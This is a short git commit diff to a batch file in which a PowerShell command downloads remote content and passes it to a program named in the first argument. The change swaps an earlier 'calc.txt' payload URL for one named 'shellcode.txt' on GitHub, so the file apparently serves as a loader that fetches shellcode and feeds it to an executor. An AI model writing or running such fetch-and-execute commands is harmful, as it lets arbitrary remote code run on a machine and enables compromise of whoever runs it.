36eb074e7f7bb6c1012c40a3b16db3c795d8c026
roboisaac11 <88291918+roboisaac11@users.noreply.github.com>
2024-04-06 17:02:39 -0700

    Update file.bat

--- file.bat
+++ file.bat
@@ -1,1 +1,1 @@
-powershell -Command "$data = (Invoke-WebRequest 'https://gist.github.com/roboisaac11/ed602fe3ae548ede132238f1138f166a/raw/251103de726311fe0bad3f3a4d766481c9602f9c/calc.txt').Content; %1 $data"
+powershell -Command "$data = (Invoke-WebRequest 'https://github.com/roboisaac11/sturdy-octo-fishstick/raw/main/shellcode.txt').Content; %1 $data"
